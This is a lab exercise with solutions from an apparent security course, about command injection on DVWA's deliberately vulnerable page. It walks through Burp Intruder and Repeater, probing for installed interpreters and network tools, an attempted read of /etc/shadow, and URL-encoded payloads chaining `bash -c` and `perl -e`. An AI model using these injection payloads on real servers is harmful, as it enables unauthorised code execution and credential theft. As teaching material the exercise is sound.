# Extracting Errors

In this exercise, you'll use `2>&1` to creat a template payload and collect additional information from the server.

---
## Instructions
- Click the **Command Injection** vulnerability in the left navigation bar.

### Error Information
- Enable Foxy Proxy, launch Burp Suite, and intercept a request through the IP address form.

- Send the request to Intruder, and set a position around the command. Include `2>&1` in your payload, and encode any characters that require encoding.

- Set payloads to extract the following information:
  - The version of PHP, Python, Perl, and Ruby installed (_each is a separate payload_)
  - Whether `curl`, `wget`, `socat`, and `ncat` are installed (_each is a separate payload_)
  - The contents of `/etc/shadow`
  - Be sure to automatically flag tools that aren't installed.
  > **Solution**
  > ```bash
  > # The version of PHP, Python, Perl, and Ruby installed (_each is a separate payload_)
  > php --version
  > python --version
  > perl --version
  > ruby --version
  > # Whether `curl`, `wget`, `socat`, and `ncat` are installed (_each is a separate payload_)
  > curl --version
  > wget --version
  > socat --version
  > ncat --version
  > # The contents of `/etc/shadow`
  > cat /etc/shadow
  > ```

- Answer the questions below.
  - Why can't you read `/etc/shadow`? 
  - Which network tools are installed?
  - Which programming languages are installed?
  > **Solutions**
  >   - Note that `/etc/shadow` is not visible due to a permissions error.
  >   - Only `socat` is installed.
  >   - PHP and Perl are installed.

### Injecting Code
Note that Perl, PHP, and bash are installed.

These can all be used to run scripts and run code, as you've already achieved with your PHP webshell. In the next section, you'll see how to use bash and Perl to execute arbitrary code on the server.

- Navigate to the **Command Injection** page in DVWA, and enter: `bad || bash -c 'echo "hello"'`. Note that this prints `hello`, indicating that `echo` got executed.
  - This is because `-c` means: "Run the following string as code."
  - **Be sure to use the right quotes**—i.e., single quotes on the argument to bash: `bash -c 'COMMAND'`. **This is important**.

- Resend and intercept the above request, and send it to Repeater.

- Set up a "template" for your injection. It should look like the below, **but with `&` and spaces encoded**. Be sure to include the stderr redirect.
  - `ip=bad || bash -c 'COMMAND' 2>&1&Submit=submit`
  > **Solution**: The POST body looks like: `ip=bad+||+bash+-c+%27COMMAND%27+2>%261&Submit=submit`.

- Next, open [testscript.sh](testscript.sh). This is a simple bash script that prints the numebrs 1-10 to a file. 
  - This script isn't interesting in and of itself, but if you can exploit the injection vulnerability to get it to run on the server, you'll be able to do a lot more than run single commands at a time.

- Copy `testscript.sh` to your clipboard with `Ctrl + C`. Then, in Burp, click the **Decoder** tab (two tabs to the right of **Repeater**).

- Paste the contents of `testscript.sh` into the top pane. On the right navigation bar; click **Encode as**; and select **URL**. This prints the URL-encoded version of the script in the bottom pane. You can send this encoded version through an HTTP request!
  > **Solution**: The encoded script is below.
  > ```bash
  > %66%6f%72%20%4c%49%4e%45%20%69%6e%20%24%28%73%65%71%20%30%20%31%30%29%0a%64%6f%0a%20%20%65%63%68%6f%20%22%50%72%69%6e%74%69%6e%67%20%6c%69%6e%65%20%24%4c%49%4e%45%20%66%72%6f%6d%20%61%20%73%63%72%69%70%74%20%28%21%29%22%20%3e%3e%20%68%61%63%6b%65%72%5f%6c%6f%67%0a%64%6f%6e%65%0a
  > ```

- Return to Repeater. Find `COMMAND` in your template. Replace it with the URL-encoded script.

- Press **Go**, and wait for the response to come back. You should get no output.

- Use Repeater to inject `cat hacker_log`, and note what you see.
  > **Solution**: You'll notice a new file with all ten lines printed—you successfully ran a "complex" shell script through an HTTP request!

### Injecting Perl
You can use a similar trick to inject Perl code.

Use Repeater to send the following payload:
  `bad || perl -e "print 'haxxed'"`

Note that this does the same thing as `bash -c`.

You are, of course, _not_ expected to know or learn Perl. But it's good to be aware that this kind of injection is possible, as it comes installed on most Linux distributions.
